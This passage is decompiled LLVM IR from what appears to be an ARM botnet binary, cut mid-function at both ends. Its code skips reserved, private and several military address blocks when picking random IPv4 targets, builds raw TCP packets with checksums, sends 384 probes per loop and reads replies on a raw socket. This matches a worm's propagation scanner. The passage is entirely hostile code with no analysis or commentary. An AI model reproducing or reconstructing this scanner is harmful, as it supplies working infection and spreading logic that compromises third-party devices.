  br i1 %v7_e70c, label %dec_label_pc_e6e4, label %dec_label_pc_e714

dec_label_pc_e714:                                ; preds = %dec_label_pc_e70c
  %v1_e714 = add nsw i32 %v1_e6e8, -15
  store i32 %v1_e714, i32* %r3.global-to-local, align 4
  %v2_e718 = icmp ugt i32 %v1_e6e8, 55
  store i1 %v2_e718, i1* %cpsr_c.global-to-local, align 1
  %v7_e718 = icmp eq i32 %v1_e6e8, 56
  store i1 %v7_e718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e718, label %dec_label_pc_e6e4, label %bb375

bb375:                                            ; preds = %dec_label_pc_e714
  %v3_e71c = icmp ne i32 %v1_e714, 0
  store i1 %v3_e71c, i1* %cpsr_c.global-to-local, align 1
  %v8_e71c = icmp eq i32 %v1_e714, 1
  store i1 %v8_e71c, i1* %cpsr_z.global-to-local, align 1
  %v2_e720 = xor i1 %v3_e71c, true
  %v3_e720 = or i1 %v8_e71c, %v2_e720
  br i1 %v3_e720, label %dec_label_pc_e6e4, label %dec_label_pc_e724

dec_label_pc_e724:                                ; preds = %bb375
  %v2_e724 = icmp ugt i32 %v1_e6e8, 9
  store i1 %v2_e724, i1* %cpsr_c.global-to-local, align 1
  %v7_e724 = icmp eq i32 %v1_e6e8, 10
  store i1 %v7_e724, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e724, label %dec_label_pc_e6e4, label %dec_label_pc_e72c

dec_label_pc_e72c:                                ; preds = %dec_label_pc_e724
  %v2_e72c = icmp ugt i32 %v1_e6e8, 191
  store i1 %v2_e72c, i1* %cpsr_c.global-to-local, align 1
  %v7_e72c = icmp eq i32 %v1_e6e8, 192
  store i1 %v7_e72c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e72c, label %bb376, label %dec_label_pc_e738

bb376:                                            ; preds = %dec_label_pc_e72c
  %v3_e730 = icmp ugt i32 %v1_e6fc, 167
  store i1 %v3_e730, i1* %cpsr_c.global-to-local, align 1
  %v8_e730 = icmp eq i32 %v1_e6fc, 168
  store i1 %v8_e730, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e730, label %dec_label_pc_e6e4, label %dec_label_pc_e738

dec_label_pc_e738:                                ; preds = %dec_label_pc_e72c, %bb376
  %v7_e738 = icmp eq i32 %v1_e6e8, 172
  %.461 = zext i1 %v7_e738 to i32
  store i32 %.461, i32* %r3.global-to-local, align 4
  %v2_e744 = icmp ugt i32 %v1_e6fc, 14
  store i1 %v2_e744, i1* %cpsr_c.global-to-local, align 1
  %v7_e744 = icmp eq i32 %v1_e6fc, 15
  store i1 %v7_e744, i1* %cpsr_z.global-to-local, align 1
  %v2_e748 = xor i1 %v2_e744, true
  %v3_e748 = or i1 %v7_e744, %v2_e748
  br i1 %v3_e748, label %.thread8, label %bb379

.thread8:                                         ; preds = %dec_label_pc_e738
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e75c

bb379:                                            ; preds = %dec_label_pc_e738
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e74c = icmp eq i1 %v7_e738, false
  store i1 %v2_e74c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e74c, label %dec_label_pc_e75c, label %dec_label_pc_e754

dec_label_pc_e754:                                ; preds = %bb379
  %v2_e754 = icmp ugt i32 %v1_e6fc, 30
  store i1 %v2_e754, i1* %cpsr_c.global-to-local, align 1
  %v7_e754 = icmp eq i32 %v1_e6fc, 31
  store i1 %v7_e754, i1* %cpsr_z.global-to-local, align 1
  %v2_e758 = xor i1 %v2_e754, true
  %v3_e758 = or i1 %v7_e754, %v2_e758
  br i1 %v3_e758, label %dec_label_pc_e6e4, label %dec_label_pc_e75c

dec_label_pc_e75c:                                ; preds = %.thread8, %dec_label_pc_e754, %bb379
  %v7_e75c = icmp eq i32 %v1_e6e8, 100
  %.462 = zext i1 %v7_e75c to i32
  store i32 %.462, i32* %r3.global-to-local, align 4
  %v2_e768 = icmp ugt i32 %v1_e6fc, 62
  store i1 %v2_e768, i1* %cpsr_c.global-to-local, align 1
  %v7_e768 = icmp eq i32 %v1_e6fc, 63
  store i1 %v7_e768, i1* %cpsr_z.global-to-local, align 1
  %v2_e76c = xor i1 %v2_e768, true
  %v3_e76c = or i1 %v7_e768, %v2_e76c
  br i1 %v3_e76c, label %.thread13, label %bb382

.thread13:                                        ; preds = %dec_label_pc_e75c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e780

bb382:                                            ; preds = %dec_label_pc_e75c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e770 = icmp eq i1 %v7_e75c, false
  store i1 %v2_e770, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e770, label %dec_label_pc_e780, label %dec_label_pc_e778

dec_label_pc_e778:                                ; preds = %bb382
  %v2_e778 = icmp ugt i32 %v1_e6fc, 125
  store i1 %v2_e778, i1* %cpsr_c.global-to-local, align 1
  %v7_e778 = icmp eq i32 %v1_e6fc, 126
  store i1 %v7_e778, i1* %cpsr_z.global-to-local, align 1
  %v2_e77c = xor i1 %v2_e778, true
  %v3_e77c = or i1 %v7_e778, %v2_e77c
  br i1 %v3_e77c, label %dec_label_pc_e6e4, label %dec_label_pc_e780

dec_label_pc_e780:                                ; preds = %.thread13, %dec_label_pc_e778, %bb382
  %v2_e780 = icmp ugt i32 %v1_e6e8, 168
  store i1 %v2_e780, i1* %cpsr_c.global-to-local, align 1
  %v7_e780 = icmp eq i32 %v1_e6e8, 169
  store i1 %v7_e780, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e780, label %bb383, label %dec_label_pc_e78c

bb383:                                            ; preds = %dec_label_pc_e780
  %v3_e784 = icmp eq i32 %v1_e6fc, 255
  store i1 %v3_e784, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_e784, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e784, label %dec_label_pc_e6e4, label %dec_label_pc_e78c

dec_label_pc_e78c:                                ; preds = %dec_label_pc_e780, %bb383
  %v7_e78c = icmp eq i32 %v1_e6e8, 198
  %.463 = zext i1 %v7_e78c to i32
  store i32 %.463, i32* %r3.global-to-local, align 4
  %v2_e798 = icmp ugt i32 %v1_e6fc, 16
  store i1 %v2_e798, i1* %cpsr_c.global-to-local, align 1
  %v7_e798 = icmp eq i32 %v1_e6fc, 17
  store i1 %v7_e798, i1* %cpsr_z.global-to-local, align 1
  %v2_e79c = xor i1 %v2_e798, true
  %v3_e79c = or i1 %v7_e798, %v2_e79c
  br i1 %v3_e79c, label %.thread19, label %bb386

.thread19:                                        ; preds = %dec_label_pc_e78c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e7b0

bb386:                                            ; preds = %dec_label_pc_e78c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e7a0 = icmp eq i1 %v7_e78c, false
  store i1 %v2_e7a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e7a0, label %dec_label_pc_e7b0, label %dec_label_pc_e7a8

dec_label_pc_e7a8:                                ; preds = %bb386
  %v2_e7a8 = icmp ugt i32 %v1_e6fc, 18
  store i1 %v2_e7a8, i1* %cpsr_c.global-to-local, align 1
  %v7_e7a8 = icmp eq i32 %v1_e6fc, 19
  store i1 %v7_e7a8, i1* %cpsr_z.global-to-local, align 1
  %v2_e7ac = xor i1 %v2_e7a8, true
  %v3_e7ac = or i1 %v7_e7a8, %v2_e7ac
  br i1 %v3_e7ac, label %dec_label_pc_e6e4, label %dec_label_pc_e7b0

dec_label_pc_e7b0:                                ; preds = %.thread19, %dec_label_pc_e7a8, %bb386
  %v2_e7b0 = icmp ugt i32 %v1_e6e8, 222
  store i1 %v2_e7b0, i1* %cpsr_c.global-to-local, align 1
  %v7_e7b0 = icmp eq i32 %v1_e6e8, 223
  store i1 %v7_e7b0, i1* %cpsr_z.global-to-local, align 1
  %v2_e7b4 = xor i1 %v7_e7b0, true
  %v3_e7b4 = and i1 %v2_e7b0, %v2_e7b4
  br i1 %v3_e7b4, label %dec_label_pc_e6e4, label %dec_label_pc_e7b8

dec_label_pc_e7b8:                                ; preds = %dec_label_pc_e7b0
  %v7_e7b8 = icmp eq i32 %v1_e6e8, 106
  %.464 = zext i1 %v7_e7b8 to i32
  %v2_e7c4 = icmp ugt i32 %v1_e6fc, 185
  store i1 %v2_e7c4, i1* %cpsr_c.global-to-local, align 1
  %v7_e7c4 = icmp eq i32 %v1_e6fc, 186
  store i1 %v7_e7c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e7c4, label %bb389, label %dec_label_pc_e7d0

bb389:                                            ; preds = %dec_label_pc_e7b8
  %v2_e7b8 = icmp ugt i32 %v1_e6e8, 105
  store i1 %v2_e7b8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e7b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e7b8, label %dec_label_pc_e6e4, label %dec_label_pc_e7d0

dec_label_pc_e7d0:                                ; preds = %dec_label_pc_e7b8, %bb389
  %v2_e7d0 = icmp ugt i32 %v1_e6fc, 186
  store i1 %v2_e7d0, i1* %cpsr_c.global-to-local, align 1
  %v7_e7d0 = icmp eq i32 %v1_e6fc, 187
  store i1 %v7_e7d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e7d0, label %.thread24, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_e7d0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e7e4

.thread24:                                        ; preds = %dec_label_pc_e7d0
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e7dc = icmp eq i1 %v7_e7b8, false
  store i1 %v2_e7dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e7dc, label %dec_label_pc_e7e4, label %dec_label_pc_e6e4

dec_label_pc_e7e4:                                ; preds = %.thread25, %.thread24
  %v2_e7e4 = icmp ugt i32 %v1_e6fc, 184
  store i1 %v2_e7e4, i1* %cpsr_c.global-to-local, align 1
  %v7_e7e4 = icmp eq i32 %v1_e6fc, 185
  store i1 %v7_e7e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e7e4, label %.thread28, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_e7e4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e7f8

.thread28:                                        ; preds = %dec_label_pc_e7e4
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e7f0 = icmp eq i1 %v7_e7b8, false
  store i1 %v2_e7f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e7f0, label %dec_label_pc_e7f8, label %dec_label_pc_e6e4

dec_label_pc_e7f8:                                ; preds = %.thread29, %.thread28
  %v2_e7f8 = icmp ugt i32 %v1_e6fc, 183
  store i1 %v2_e7f8, i1* %cpsr_c.global-to-local, align 1
  %v7_e7f8 = icmp eq i32 %v1_e6fc, 184
  store i1 %v7_e7f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e7f8, label %.thread32, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_e7f8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e80c

.thread32:                                        ; preds = %dec_label_pc_e7f8
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e804 = icmp eq i1 %v7_e7b8, false
  store i1 %v2_e804, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e804, label %dec_label_pc_e80c, label %dec_label_pc_e6e4

dec_label_pc_e80c:                                ; preds = %.thread33, %.thread32
  %v2_e80c = icmp ugt i32 %v1_e6e8, 149
  store i1 %v2_e80c, i1* %cpsr_c.global-to-local, align 1
  %v7_e80c = icmp eq i32 %v1_e6e8, 150
  store i1 %v7_e80c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e80c, label %bb390, label %dec_label_pc_e818

bb390:                                            ; preds = %dec_label_pc_e80c
  %v3_e810 = icmp ugt i32 %v1_e6fc, 30
  store i1 %v3_e810, i1* %cpsr_c.global-to-local, align 1
  %v8_e810 = icmp eq i32 %v1_e6fc, 31
  store i1 %v8_e810, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e810, label %dec_label_pc_e6e4, label %dec_label_pc_e818

dec_label_pc_e818:                                ; preds = %dec_label_pc_e80c, %bb390
  %v2_e818 = icmp ugt i32 %v1_e6e8, 48
  store i1 %v2_e818, i1* %cpsr_c.global-to-local, align 1
  %v7_e818 = icmp eq i32 %v1_e6e8, 49
  store i1 %v7_e818, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e818, label %bb391, label %dec_label_pc_e824

bb391:                                            ; preds = %dec_label_pc_e818
  %v3_e81c = icmp ugt i32 %v1_e6fc, 50
  store i1 %v3_e81c, i1* %cpsr_c.global-to-local, align 1
  %v8_e81c = icmp eq i32 %v1_e6fc, 51
  store i1 %v8_e81c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e81c, label %dec_label_pc_e6e4, label %dec_label_pc_e824

dec_label_pc_e824:                                ; preds = %dec_label_pc_e818, %bb391
  %v2_e824 = icmp ugt i32 %v1_e6e8, 177
  store i1 %v2_e824, i1* %cpsr_c.global-to-local, align 1
  %v7_e824 = icmp eq i32 %v1_e6e8, 178
  store i1 %v7_e824, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e824, label %bb392, label %dec_label_pc_e830

bb392:                                            ; preds = %dec_label_pc_e824
  %v3_e828 = icmp ugt i32 %v1_e6fc, 61
  store i1 %v3_e828, i1* %cpsr_c.global-to-local, align 1
  %v8_e828 = icmp eq i32 %v1_e6fc, 62
  store i1 %v8_e828, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e828, label %dec_label_pc_e6e4, label %dec_label_pc_e830

dec_label_pc_e830:                                ; preds = %dec_label_pc_e824, %bb392
  %v2_e830 = icmp ugt i32 %v1_e6e8, 159
  store i1 %v2_e830, i1* %cpsr_c.global-to-local, align 1
  %v7_e830 = icmp eq i32 %v1_e6e8, 160
  store i1 %v7_e830, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e830, label %bb393, label %dec_label_pc_e83c

bb393:                                            ; preds = %dec_label_pc_e830
  %v3_e834 = icmp ugt i32 %v1_e6fc, 12
  store i1 %v3_e834, i1* %cpsr_c.global-to-local, align 1
  %v8_e834 = icmp eq i32 %v1_e6fc, 13
  store i1 %v8_e834, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e834, label %dec_label_pc_e6e4, label %dec_label_pc_e83c

dec_label_pc_e83c:                                ; preds = %dec_label_pc_e830, %bb393
  %v1_e83c = add nsw i32 %v1_e6e8, -6
  store i32 %v1_e83c, i32* %r3.global-to-local, align 4
  %v2_e840 = icmp ugt i32 %v1_e6e8, 10
  store i1 %v2_e840, i1* %cpsr_c.global-to-local, align 1
  %v7_e840 = icmp eq i32 %v1_e6e8, 11
  store i1 %v7_e840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e840, label %dec_label_pc_e6e4, label %bb394

bb394:                                            ; preds = %dec_label_pc_e83c
  %v3_e844 = icmp ne i32 %v1_e83c, 0
  store i1 %v3_e844, i1* %cpsr_c.global-to-local, align 1
  %v8_e844 = icmp eq i32 %v1_e83c, 1
  store i1 %v8_e844, i1* %cpsr_z.global-to-local, align 1
  %v2_e848 = xor i1 %v3_e844, true
  %v3_e848 = or i1 %v8_e844, %v2_e848
  br i1 %v3_e848, label %dec_label_pc_e6e4, label %dec_label_pc_e84c

dec_label_pc_e84c:                                ; preds = %bb394
  %v2_e84c = icmp ugt i32 %v1_e6e8, 21
  store i1 %v2_e84c, i1* %cpsr_c.global-to-local, align 1
  %v7_e84c = icmp eq i32 %v1_e6e8, 22
  store i1 %v7_e84c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e84c, label %dec_label_pc_e6e4, label %bb395

bb395:                                            ; preds = %dec_label_pc_e84c
  %v3_e850 = icmp ugt i32 %v1_e6e8, 20
  store i1 %v3_e850, i1* %cpsr_c.global-to-local, align 1
  %v8_e850 = icmp eq i32 %v1_e6e8, 21
  store i1 %v8_e850, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e850, label %dec_label_pc_e6e4, label %dec_label_pc_e858

dec_label_pc_e858:                                ; preds = %bb395
  %v2_e858 = icmp ugt i32 %v1_e6e8, 27
  store i1 %v2_e858, i1* %cpsr_c.global-to-local, align 1
  %v7_e858 = icmp eq i32 %v1_e6e8, 28
  store i1 %v7_e858, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e858, label %dec_label_pc_e6e4, label %bb396

bb396:                                            ; preds = %dec_label_pc_e858
  %v3_e85c = icmp ugt i32 %v1_e6e8, 25
  store i1 %v3_e85c, i1* %cpsr_c.global-to-local, align 1
  %v8_e85c = icmp eq i32 %v1_e6e8, 26
  store i1 %v8_e85c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e85c, label %dec_label_pc_e6e4, label %dec_label_pc_e864

dec_label_pc_e864:                                ; preds = %bb396
  %v2_e864 = icmp ugt i32 %v1_e6e8, 29
  store i1 %v2_e864, i1* %cpsr_c.global-to-local, align 1
  %v7_e864 = icmp eq i32 %v1_e6e8, 30
  store i1 %v7_e864, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e864, label %dec_label_pc_e6e4, label %bb397

bb397:                                            ; preds = %dec_label_pc_e864
  %v3_e868 = icmp ugt i32 %v1_e6e8, 28
  store i1 %v3_e868, i1* %cpsr_c.global-to-local, align 1
  %v8_e868 = icmp eq i32 %v1_e6e8, 29
  store i1 %v8_e868, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e868, label %dec_label_pc_e6e4, label %dec_label_pc_e870

dec_label_pc_e870:                                ; preds = %bb397
  %v2_e870 = icmp ugt i32 %v1_e6e8, 54
  store i1 %v2_e870, i1* %cpsr_c.global-to-local, align 1
  %v7_e870 = icmp eq i32 %v1_e6e8, 55
  store i1 %v7_e870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e870, label %dec_label_pc_e6e4, label %bb398

bb398:                                            ; preds = %dec_label_pc_e870
  %v3_e874 = icmp ugt i32 %v1_e6e8, 32
  store i1 %v3_e874, i1* %cpsr_c.global-to-local, align 1
  %v8_e874 = icmp eq i32 %v1_e6e8, 33
  store i1 %v8_e874, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e874, label %dec_label_pc_e6e4, label %dec_label_pc_e87c

dec_label_pc_e87c:                                ; preds = %bb398
  %v2_e87c = icmp ugt i32 %v1_e6e8, 214
  store i1 %v2_e87c, i1* %cpsr_c.global-to-local, align 1
  %v7_e87c = icmp eq i32 %v1_e6e8, 215
  store i1 %v7_e87c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e87c, label %.thread48, label %bb399

bb399:                                            ; preds = %dec_label_pc_e87c
  %v3_e880 = icmp ugt i32 %v1_e6e8, 213
  store i1 %v3_e880, i1* %cpsr_c.global-to-local, align 1
  %v8_e880 = icmp eq i32 %v1_e6e8, 214
  store i1 %v8_e880, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e880, label %bb400, label %dec_label_pc_e890

.thread48:                                        ; preds = %dec_label_pc_e87c
  br label %dec_label_pc_e6e4

bb400:                                            ; preds = %bb399
  br label %dec_label_pc_e6e4

dec_label_pc_e890:                                ; preds = %bb399
  %v5_e89c = call i32 @llvm.bswap.i32(i32 %v0_e6e4)
  store i32 %v5_e89c, i32* %r3.global-to-local, align 4
  %tmp401 = and i32 %v0_e6e4, 65280
  %tmp402 = call i32 @llvm.bswap.i32(i32 %tmp401)
  %v3_e8a4 = udiv i32 %v5_e89c, 16777216
  %tmp403 = and i32 %v0_e6e4, 16711680
  %tmp404 = call i32 @llvm.bswap.i32(i32 %tmp403)
  %v4_e8ac = udiv i32 %tmp402, 256
  %v4_e8b0 = mul nuw nsw i32 %tmp404, 256
  store i32 ptrtoint (i8** @global_var_218dc.153 to i32), i32* @r0, align 4
  %tmp405 = and i32 %v0_e6e4, 65536
  %v3_e8b8 = icmp ne i32 %tmp405, 0
  store i1 %v3_e8b8, i1* %cpsr_c.global-to-local, align 1
  %v4_e8b8 = mul i32 %v5_e89c, 16777216
  %v5_e8ac = or i32 %v4_e8b8, %v3_e8a4
  %v5_e8b0 = or i32 %v5_e8ac, %v4_e8ac
  %v5_e8b8 = or i32 %v5_e8b0, %v4_e8b0
  store i32 %v5_e8b8, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_218e6.195 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_e8b8, i32* @global_var_218ec.196, align 4
  %v3_e8c8 = call i32 @checksum_generic(i32 ptrtoint (i8** @global_var_218dc.153 to i32), i32 20)
  %v4_e8c8 = trunc i32 %v3_e8c8 to i16
  store i32 %v3_e8c8, i32* %r0.global-to-local, align 4
  %v3_e8cc = load i32, i32* %stack_var_-52, align 4
  %v5_e8dc = sdiv i32 %v3_e8cc, 10
  %v3_e8e0 = mul i32 %v5_e8dc, 8
  store i32 %v3_e8e0, i32* %r2.global-to-local, align 4
  %v2_e8e8 = mul i32 %v5_e8dc, 10
  store i32 %v2_e8e8, i32* %r3.global-to-local, align 4
  %v3_e8ec = icmp uge i32 %v3_e8cc, %v2_e8e8
  store i1 %v3_e8ec, i1* %cpsr_c.global-to-local, align 1
  %v9_e8ec = icmp eq i32 %v3_e8cc, %v2_e8e8
  store i1 %v9_e8ec, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i8** @global_var_218dc.153 to i32), i32* %r1.global-to-local, align 4
  br i1 %v9_e8ec, label %bb406, label %.thread60

.thread60:                                        ; preds = %dec_label_pc_e890
  store i32 ptrtoint (i16* @global_var_218f0.156 to i32), i32* %r3.global-to-local, align 4
  store i16 %v4_e8c8, i16* bitcast (i32* @global_var_218e6.195 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_218dc.153 to i32), i32* %r0.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_218f0.156 to i32), i32 2) to i16*), align 2
  %v4_e90c = load i32, i32* @global_var_218ec.196, align 4
  store i32 %v4_e90c, i32* @global_var_218f4.198, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb407

bb406:                                            ; preds = %dec_label_pc_e890
  store i16 %v4_e8c8, i16* bitcast (i32* @global_var_218e6.195 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_218dc.153 to i32), i32* %r0.global-to-local, align 4
  %v4_e90c54 = load i32, i32* @global_var_218ec.196, align 4
  store i32 ptrtoint (i16* @global_var_218f0.156 to i32), i32* %r2.global-to-local, align 4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i32 %v4_e90c54, i32* @global_var_218f4.198, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_218f0.156 to i32), i32 2) to i16*), align 2
  br label %bb407

bb407:                                            ; preds = %.thread60, %bb406
  store i16 0, i16* bitcast (i32* @global_var_21900.199 to i16*), align 4
  store i32 ptrtoint (i16* @global_var_218f0.156 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v6_e938 = call i32 @checksum_tcpudp(i32 ptrtoint (i8** @global_var_218dc.153 to i32), i32 sext (i16 ptrtoint (i16* @global_var_218f0.156 to i16) to i32), i32 5120, i32 20)
  %v7_e938 = trunc i32 %v6_e938 to i16
  store i32 ptrtoint (i8** @global_var_218dc.153 to i32), i32* %r1.global-to-local, align 4
  %v2_e944 = load i32, i32* @global_var_243f4.151, align 4
  store i16 %v7_e938, i16* bitcast (i32* @global_var_21900.199 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_e970 = load i16, i16* @global_var_218f2.161, align 2
  %v4_e970 = zext i16 %v3_e970 to i32
  store i32 %v4_e970, i32* @lr, align 4
  store i32 %v2_f7e4, i32* %ip.global-to-local, align 4
  store i32 %v2_e944, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_e98c = call i32 @__libc_sendto(i32 %v2_e944, i32 ptrtoint (i8** @global_var_218dc.153 to i32), i32 40, i32 16384, i32 %v2_e6b4, i32 16)
  store i32 %v7_e98c, i32* %r0.global-to-local, align 4
  %v3_e990 = load i32, i32* %stack_var_-52, align 4
  %v1_e994 = add i32 %v3_e990, 1
  store i32 %v1_e994, i32* %r3.global-to-local, align 4
  %v3_e998 = icmp ugt i32 %v1_e994, 383
  store i1 %v3_e998, i1* %cpsr_c.global-to-local, align 1
  %v8_e998 = icmp eq i32 %v1_e994, 384
  store i1 %v8_e998, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_e994, i32* %stack_var_-52, align 4
  %v5_e9a0 = icmp slt i32 %v1_e994, 384
  br i1 %v5_e9a0, label %dec_label_pc_e6b8, label %dec_label_pc_e9a4

dec_label_pc_e9a4:                                ; preds = %bb407
  %v0_e9a4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_e9a8

dec_label_pc_e9a8:                                ; preds = %dec_label_pc_e694, %dec_label_pc_e9a4
  %stack_var_-1876.1 = phi i32 [ %stack_var_-1876.0, %dec_label_pc_e694 ], [ %v0_e9a4, %dec_label_pc_e9a4 ]
  %v0_e9a8 = call i32 @__GI___errno_location()
  store i32 %v0_e9a8, i32* @fp, align 4
  store i32 %v2_e68c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_e9b8, i32* @r4, align 4
  br label %dec_label_pc_e9bc

dec_label_pc_e9bc:                                ; preds = %dec_label_pc_ea7c, %dec_label_pc_ea74, %dec_label_pc_ea6c, %dec_label_pc_ea48, %dec_label_pc_ea38, %dec_label_pc_ea1c, %dec_label_pc_ea04, %dec_label_pc_ea64, %dec_label_pc_ea58, %dec_label_pc_e9fc, %dec_label_pc_eb34, %dec_label_pc_e9a8
  %v1_e9c0 = phi i32 [ %v0_e9a8, %dec_label_pc_e9a8 ], [ %v1_e9c0.pre.pre, %dec_label_pc_eb34 ], [ %v0_e9f0, %dec_label_pc_e9fc ], [ %v0_e9f0, %dec_label_pc_ea58 ], [ %v0_e9f0, %dec_label_pc_ea64 ], [ %v0_e9f0, %dec_label_pc_ea04 ], [ %v0_e9f0, %dec_label_pc_ea1c ], [ %v0_e9f0, %dec_label_pc_ea38 ], [ %v0_e9f0, %dec_label_pc_ea48 ], [ %v0_e9f0, %dec_label_pc_ea6c ], [ %v0_e9f0, %dec_label_pc_ea74 ], [ %v0_e9f0, %dec_label_pc_ea7c ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_e9c0 = inttoptr i32 %v1_e9c0 to i32*
  store i32 0, i32* %v2_e9c0, align 4
  %v2_e9cc = load i32, i32* @global_var_243f4.151, align 4
  store i32 %v2_e9cc, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_e68c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e9dc = load i32, i32* %ip.global-to-local, align 4
  %v6_e9e4 = call i32 @__libc_recvfrom(i32 %v2_e9cc, i32 %v2_e68c, i32 1514, i32 16384, i32 %v0_e9dc, i32 %v0_e9dc)
  store i32 %v6_e9e4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e9e8 = icmp eq i32 %v6_e9e4, 0
  store i1 %v2_e9e8, i1* %cpsr_z.global-to-local, align 1
  %tmp408 = icmp slt i32 %v6_e9e4, 1
  br i1 %tmp408, label %dec_label_pc_eb44, label %dec_label_pc_e9f0

dec_label_pc_e9f0:                                ; preds = %dec_label_pc_e9bc
  %v0_e9f0 = load i32, i32* @fp, align 4
  %v1_e9f0 = inttoptr i32 %v0_e9f0 to i32*
  %v2_e9f0 = load i32, i32* %v1_e9f0, align 4
  store i32 %v2_e9f0, i32* %r3.global-to-local, align 4
  %v2_e9f4 = icmp ugt i32 %v2_e9f0, 10
  store i1 %v2_e9f4, i1* %cpsr_c.global-to-local, align 1
  %v7_e9f4 = icmp eq i32 %v2_e9f0, 11
  store i1 %v7_e9f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9f4, label %dec_label_pc_eb44, label %dec_label_pc_e9fc

dec_label_pc_e9fc:                                ; preds = %dec_label_pc_e9f0
  %v2_e9fc = icmp ugt i32 %v6_e9e4, 38
  store i1 %v2_e9fc, i1* %cpsr_c.global-to-local, align 1
  %v7_e9fc = icmp eq i32 %v6_e9e4, 39
  store i1 %v7_e9fc, i1* %cpsr_z.global-to-local, align 1
  %v2_ea00 = xor i1 %v2_e9fc, true
  %v3_ea00 = or i1 %v7_e9fc, %v2_ea00
